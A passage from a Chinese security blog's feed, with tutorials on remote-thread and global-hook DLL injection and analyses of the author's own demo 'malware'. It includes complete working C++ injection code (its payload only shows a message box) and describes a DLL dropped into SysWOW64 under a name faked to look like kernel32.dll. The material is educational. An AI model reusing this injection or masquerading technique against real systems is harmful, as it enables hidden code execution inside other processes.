    <content type="html"><![CDATA[<h4 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h4><p>远程线程注入是指一个进程在另一个进程中创建线程的技术。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="OpenProcess"><a href="#OpenProcess" class="headerlink" title="OpenProcess"></a>OpenProcess</h5><p>打开现有的本地进程对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE OpenProcess(</span><br><span class="line">  DWORD dwDesiredAccess,</span><br><span class="line">  BOOL  bInheritHandle,</span><br><span class="line">  DWORD dwProcessId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwDesiredAccess：访问进程对象。此访问权限为针对进程的安全描述符进行检查，此参数可以是一个或者多个进程访问权限。如果调用了该函数的进程启用了SeDebugPrivilege权限，则无论安全描述符的内容是什么，它都会授予所请求的访问权限。</p><p>bInheritHandle：若此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程不会进程此句柄。</p><p>dwProcessId：要打开的本地进程PID。</p><p>返回值：如果函数成功，则返回值是指定进程的打开句柄；如果失败，则返回值为NULL。</p><h5 id="VirtualAllocEx"><a href="#VirtualAllocEx" class="headerlink" title="VirtualAllocEx"></a>VirtualAllocEx</h5><p>在指定进程的虚拟地址空间内保留、提交或更改内存的状态。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID VirtualAllocEx(</span><br><span class="line">  HANDLE hProcess,</span><br><span class="line">  LPVOID lpAddress,</span><br><span class="line">  SIZE_T dwSize,</span><br><span class="line">  DWORD  flAllocationType,</span><br><span class="line">  DWORD  flProtect</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：进程的句柄。此函数在该进程的虚拟地址空间内分配内存，句柄必须具有PROCESS_VM_OPERATION访问权限。</p><p>lpAddress：指定要分配页面所需起始地址的指针。如果为NULL，则该函数自动分配内存。</p><p>dwSize：要分配的内存大小，以字节为单位。</p><p>flAllocationType：内存分配类型。此参数必须为以下值之一。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>MEM_COMMIT<BR>0x00001000</BR></td><td>在磁盘的分页文件和整体内存中，为指定的预留内存页分配内存</td></tr><tr><td>MEM_RESERVE<BR>0x00002000</BR></td><td>保留进程中虚拟地址空间的范围，但不会在内存或磁盘上的分页文件中分配任何实际物理存储位置</td></tr><tr><td>MEM_RESET<BR>0x00080000</BR></td><td>表示不再关注由lpAddress和dwSize指定的内存范围内的数据，页面不应从页面文件中读取或写入。</td></tr><tr><td>MEM_RESET_UNDO<BR>0x1000000</BR></td><td>只能在早期成功应用了MEM_RESET的地址范围内调用MEM_RESET_UNDO</td></tr></tbody></table><p>flProtect：要分配的页面区域的内存保护。如果页面已提交，则可以指定任何一个内存保护常量。如果lpAddress指定了一个地址，则flProtect不能是以下任何值：</p><ul><li>PAGE_NOACCESS</li><li>PAGE_GUARD</li><li>PAGE_NOCACHE</li><li>PAGE_WRITECOMBINE</li></ul><p>返回值：如果函数成功，则返回值是分配页面的基址；如果失败，则返回为NULL。</p><h5 id="WriteProcessMemory"><a href="#WriteProcessMemory" class="headerlink" title="WriteProcessMemory"></a>WriteProcessMemory</h5><p>在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL WriteProcessMemory(</span><br><span class="line">  HANDLE  hProcess,</span><br><span class="line">  LPVOID  lpBaseAddress,</span><br><span class="line">  LPCVOID lpBuffer,</span><br><span class="line">  SIZE_T  nSize,</span><br><span class="line">  SIZE_T  *lpNumberOfBytesWritten</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。</p><p>lpBaseAddress：指向指定进程中写入数据的基地址指针。在数据传输发生之前，系统会验证指定大小的基地址和内存中的所有数据是否可以进行写入访问，如果不可以访问，则该函数将失败。</p><p>lpBuffer：指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。</p><p>nSize：要写入指定进程的字节数。</p><p>lpNumberOfBytesWritten：指向变量的指针，该变量接受传输到指定进程的字节数。如果为NULL，则忽略该参数。</p><p>返回值：如果函数成功，则返回值不为0；如果失败，则为0；</p><h5 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h5><p>创建一个在另一个进程的虚拟地址空间中运行的线程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateRemoteThread(</span><br><span class="line">  HANDLE                 hProcess,</span><br><span class="line">  LPSECURITY_ATTRIBUTES  lpThreadAttributes,</span><br><span class="line">  SIZE_T                 dwStackSize,</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">  LPVOID                 lpParameter,</span><br><span class="line">  DWORD                  dwCreationFlags,</span><br><span class="line">  LPDWORD                lpThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>hProcess：要创建线程的进程的句柄。句柄必须具有PROCESS_CREATE_THREAD、PROCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。</p><p>lpThreadAttributes：指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定子进程是否可以继承返回的句柄。如果为NULL，则线程将会获得默认的安全描述符，并且不能继承该句柄。</p><p>dwStackSize：堆栈的初始大小，以字节为单位。如果参数为0，则新线程使用可执行文件的默认大小。</p><p>lpStartAddress：指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。</p><p>lpParameter：指向要传递给线程函数的变量的指针。</p><p>dwCreationFlags：控制线程创建的标志。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>线程在创建后立即运行</td></tr><tr><td>CREATE_SUSPENDED<BR></BR></td><td>该线程在挂起状态下创建，并且在调用ResumeThread函数之前不会运行</td></tr><tr><td>STACK_SIZE_PARAM_IS_A_RESERVATION<BR></BR></td><td>所述dwStackSize参数指定堆栈的初始保留大小。如果未指定此标志，则dwStackSize指定提交大小。</td></tr></tbody></table><p>lpThreadId：指向接受线程标识符的变量的指针。如果此参数为NULL，则不返回线程标识符。</p><p>返回值：如果成功，则返回值是新线程的句柄；如果失败，则返回NULL。</p><h4 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h4><p>RemoteThreadInject.cpp代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;processthreadsapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">BOOL <span class="title">CreateRemoteThreadInject</span><span class="params">(DWORD dwProcessId, WCHAR* pszDllFileName)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">DWORD dwSize = <span class="number">0</span>;</span><br><span class="line">LPVOID pDllAddr = <span class="literal">NULL</span>;</span><br><span class="line">FARPROC pFuncProcAddr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">//获取注入进程句柄</span></span><br><span class="line">hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);</span><br><span class="line"><span class="keyword">if</span> (hProcess == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">dwSize = lstrlen(pszDllFileName) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//申请内存</span></span><br><span class="line">pDllAddr = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pDllAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//向申请的内存写入数据</span></span><br><span class="line">BOOL WriteFlag = WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize * <span class="number">2</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (WriteFlag == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;写入内存失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取loadlibrary</span></span><br><span class="line">pFuncProcAddr = GetProcAddress(GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pFuncProcAddr == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取loadlibrary地址失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hRemoteThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;创建线程失败\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">WaitForSingleObject(hRemoteThread, <span class="number">-1</span>);</span><br><span class="line">DWORD code;</span><br><span class="line">GetExitCodeThread(hRemoteThread, &amp;code);</span><br><span class="line">code = GetLastError();</span><br><span class="line">VirtualFreeEx(hProcess, pDllAddr, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line">CloseHandle(hRemoteThread);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;按下回车开始注入\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line">HWND hNotepadWindow = FindWindow(<span class="string">L&quot;Notepad&quot;</span>,<span class="string">L&quot;无标题 - 记事本&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (hNotepadWindow == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;打开进程失败\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwPID = <span class="number">0</span>;</span><br><span class="line">GetWindowThreadProcessId(hNotepadWindow, &amp;dwPID);</span><br><span class="line"><span class="keyword">if</span> (dwPID == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;获取PID失败\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> flag = CreateRemoteThreadInject(dwPID, <span class="string">L&quot;C:\\Users\\Tophanter\\Desktop\\RemoteTest.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (flag == FALSE) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入失败\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;注入成功\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>dllmain.cpp代码如下，主要实现一个弹窗功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="params"><span class="function">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;注入成功！&quot;</span>, <span class="string">L&quot;ok&quot;</span>, MB_OK);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="效果查看"><a href="#效果查看" class="headerlink" title="效果查看"></a>效果查看</h4><p>先打开notepad再打开我们编写的程序，将DLL文件放在指定路径下。</p><p><img src="/2021/07/12/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/1.png"></p><p>开始注入，就可以看到已经成功弹出了窗口。</p><p><img src="/2021/07/12/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5/2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;远程线程注入&quot;&gt;&lt;a href=&quot;#远程线程注入&quot; class=&quot;headerlink&quot; title=&quot;远程线程注入&quot;&gt;&lt;/a&gt;远程线程注入&lt;/h4&gt;&lt;p&gt;远程线程注入是指一个进程在另一个进程中创建线程的技术。&lt;/p&gt;
&lt;h4 id=&quot;函数介绍&quot;&gt;&lt;a href=</summary>
      
    
    
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/categories/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    
    <category term="恶意代码" scheme="https://b1ack1e.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/"/>
    
    <category term="黑客编程" scheme="https://b1ack1e.github.io/tags/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/"/>
    
    <category term="注入" scheme="https://b1ack1e.github.io/tags/%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>病毒分析-资源释放+钩子注入</title>
    <link href="https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-12T02:15:02.000Z</published>
    <updated>2021-07-12T03:52:12.644Z</updated>
    
    <content type="html"><![CDATA[<p>把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。</p><p>使用dir工具先查看一下基本信息，可以看到当前程序未加壳。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/1.png"></p><p>再查看一下导入表的相关信息，看看都使用了哪些API。可以看到一些资源相关API，还有Loadlibrary和getprocaddress，这两个API，写过shellcode都知道使用这两个API可以获取所有dll和其中的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/2.png"></p><p>再查看一下字符串的一些信息，可以看到有这样一个字符串“C:\Windows\SysWOW64\kerne132.dll”，可以看到这个dll和系统dll”kernel32.dll”区别是最后一位，用1代替了l。可能是一个恶意的dll被释放到了C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/3.png"></p><p>使用IDA查看一下，F5查看伪代码，可以先看到资源释放的过程，其释放了一个名为“kerne132.dll”的文件到C:\Windows\SysWOW64\下。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/4.png"></p><p>然后调用了这个DLL里面的函数setglobalhook，从名字可以看出来，这应该是一个钩子的函数。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/5.png"></p><p>到目标目录下去查看一下，可以看到这个伪装成kernel32.dll的恶意dll文件。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/7.png"></p><p>使用IDA查看一下这个DLL文件，看一下它的导出表，可以看到导出了两个函数SetGlobalHook和UnsetGlobalHook，从名字上猜测应该是安装钩子和卸载钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/8.png"></p><p>查看SetGlobalHook，可以看到使用了SetWindowsHookExW函数，IDHOOK的值是3,3是WH_GETMESSAGE代表这是一个全局钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/9.png"></p><p>使用PC hunter工具可以很方便的查看是否存在钩子。</p><p><img src="/2021/07/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE+%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/6.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;把上次写的资源释放和全局钩子注入结合起来，做了一个小demo，实现功能就是把自己的写的DLL作为资源加入，然后自释放出来，再调用这个DLL进行钩子注入。&lt;/p&gt;
&lt;p&gt;使用dir工具先查看一下基本信息，可以看到当前程序未加壳。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>病毒分析-资源释放</title>
    <link href="https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/"/>
    <id>https://b1ack1e.github.io/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/</id>
    <published>2021-07-09T01:54:29.000Z</published>
    <updated>2021-07-12T02:15:39.146Z</updated>
    
    <content type="html"><![CDATA[<p>本篇来分析一下自己写的资源释放的小demo。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png"></p><p>打开程序，发现没有任何改变，没有明显的行为。</p><p>使用die工具查一下文件的基本信息</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/2.png"></p><p>查看一下导入表，可以看到FindResource等函数，这几个函数是用来操作资源的，猜测有可能是释放了一个资源节中的资源到电脑上。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/3.png"></p><p>还可以看到fwrite，fopen这样的函数，那么应该就是把资源释放到了一个路径中去。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/4.png"></p><p>可以使用resource hacker来查看程序中的资源，如图可以看到资源信息“this is a test”</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/5.png"></p><p>再使用IDA进行查看，可以很清楚的看到所有的流程，并且看到程序将释放的文件存放在了C:\Windows\System32下。</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/6.png"></p><p>因为程序是32位程序，系统是64位，所以资源会被释放到SysWOW64文件下。因为此文件夹是用来处理运行在64位系统上的32位程序的。</p><p>到路径下查找free.txt即可找到</p><p><img src="/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;本篇来分析一下自己写的资源释放的小demo。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/09/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90-%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE/1.png&quot;&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
    
    <category term="逆向工程" scheme="https://b1ack1e.github.io/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/"/>
    
    <category term="病毒分析" scheme="https://b1ack1e.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>全局钩子注入</title>
    <link href="https://b1ack1e.github.io/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/"/>
    <id>https://b1ack1e.github.io/2021/07/08/%E5%85%A8%E5%B1%80%E9%92%A9%E5%AD%90%E6%B3%A8%E5%85%A5/</id>
    <published>2021-07-08T09:52:07.000Z</published>
    <updated>2021-07-09T10:19:27.858Z</updated>
    
    <content type="html"><![CDATA[<h4 id="全局钩子注入"><a href="#全局钩子注入" class="headerlink" title="全局钩子注入"></a>全局钩子注入</h4><p>windows中大部分应用程序都是基于消息机制的，每个进程都有自己的消息队列。</p><p>局部钩子是针对某个线程的，全局钩子是作用于整个系统的基于消息的应用。全局钩子需要使用DLL文件，在DLL文件中实现相应的钩子函数。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="SetWindowsHookEx函数"><a href="#SetWindowsHookEx函数" class="headerlink" title="SetWindowsHookEx函数"></a>SetWindowsHookEx函数</h5><p>将程序定义的钩子函数安装到挂钩链中，安装钩子程序可以监视系统是否存在某些类型的事件，这些事件与特定线程或调用线程所在桌面中的所有线程相关联。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HHOOK SetWindowsHookExA(</span><br><span class="line">  int       idHook,</span><br><span class="line">  HOOKPROC  lpfn,</span><br><span class="line">  HINSTANCE hmod,</span><br><span class="line">  DWORD     dwThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h5 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h5><p>idHook：要安装的钩子程序的类型，该参数具体可以见下表。</p><table><thead><tr><th align="left">值</th><th>含义</th></tr></thead><tbody><tr><td align="left">WH_CALLWNDPROC<br>4</td><td>安装钩子程序，在系统将消息发送到目标窗口过程之前监视消息</td></tr><tr><td align="left">WH_CALLWNDPROCRET<br>12</td><td>安装钩子程序，在目标窗口过程处理消息后监视消息</td></tr><tr><td align="left">WH_CBT<br>5</td><td>安装接受对CBT应用程序有用通知的钩子程序</td></tr><tr><td align="left">WH_DEBUG<br>9</td><td>安装可用于调试其他钩子程序的钩子程序</td></tr><tr><td align="left">WH_FOREGROUNDIDLE<br>11</td><td>安装在应用程序的前台线程即将变为空闲时调用的钩子过程，该钩子对于在空闲时执行低优先级任务很有用</td></tr><tr><td align="left">WH_GETMESSAGE<br>3</td><td>安装一个挂钩过程，它监视发送到消息队列的消息</td></tr><tr><td align="left">WH_JOURNALPLAYBACK<br>1</td><td>安装一个挂钩过程，用于发布先前由WH_JOURNALRECORD挂钩过程记录的消息</td></tr><tr><td align="left">WH_JOURNALRECORD<br>0</td><td>安装一个挂钩过程，记录发布到系统消息队列中的输入消息。这个钩子对于录制宏很有用。</td></tr><tr><td align="left">WH_KEYBOARD<br>2</td><td>安装监视按键消息的挂钩过程</td></tr><tr><td align="left">WH_KEYBOARD_LL<br>13</td><td>安装监视低级键盘输入事件的挂钩过程</td></tr><tr><td 